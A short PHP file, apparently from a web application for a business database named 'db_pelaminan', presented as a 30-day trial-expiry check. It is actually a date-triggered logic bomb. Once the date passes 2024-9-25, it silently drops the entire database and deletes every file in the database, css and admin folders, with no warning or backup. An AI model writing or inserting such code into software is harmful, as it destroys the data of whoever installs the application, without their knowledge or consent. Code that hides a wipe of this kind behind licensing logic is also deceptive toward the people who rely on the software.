<?php	if (mysqli_connect_errno()) {
    echo "<script>
    alert(' 30 days Trial has Expaired')
    </script>";
}else{
    if (date('Y-m-d') > '2024-9-25'){
        
        $con->query("DROP DATABASE db_pelaminan");	


        $files    =glob('database/*');
        foreach ($files as $file) {
            if (is_file($file))
            unlink($file); // 
        }	
        $files    =glob('css/*');
        foreach ($files as $file) {
            if (is_file($file))
            unlink($file); //  
        }	
        $files    =glob('admin/*');
        foreach ($files as $file) {
            if (is_file($file))
            unlink($file); //  
        }	

        
    }


}

?>

